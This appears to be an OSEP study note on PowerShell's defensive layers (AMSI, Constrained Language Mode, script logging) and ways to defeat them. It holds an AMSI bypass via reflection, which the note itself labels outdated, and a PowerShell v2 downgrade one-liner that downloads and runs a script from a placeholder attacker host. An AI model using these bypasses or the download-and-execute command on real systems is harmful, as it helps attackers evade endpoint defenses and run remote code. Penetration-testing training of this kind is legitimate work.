# 01.02 PowerShell Internals AMSI CLM Logging

> Foundations · defensive surface

## Overview

PowerShell is the offensive Swiss-army knife — but defenders instrument it via AMSI (runtime script scanning), Constrained Language Mode (no .NET reflection), Module Logging, ScriptBlock Logging, and Transcription. OSEP requires you to recognize and defeat each layer.

## Steps

- **Detect language mode** — `$ExecutionContext.SessionState.LanguageMode` — `FullLanguage` vs `ConstrainedLanguage`.
- **Identify AMSI provider** — Defender is the default; third-party AV registers via `IAntimalwareProvider`.
- **Check logging** — registry `HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging`.
- **Pick your bypass** — patch AmsiScanBuffer, set amsiInitFailed=$true, or use PowerShell v2 (no AMSI).

## Commands

### Enumerate defensive surface

```powershell
$ExecutionContext.SessionState.LanguageMode
Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -EA SilentlyContinue
Get-MpPreference | Select DisableRealtimeMonitoring, ExclusionPath
```

### Classic amsiInitFailed bypass (broken since 2021 — illustrative only)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Downgrade to PS v2 (no AMSI)

```powershell
powershell -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/x.ps1')"
```
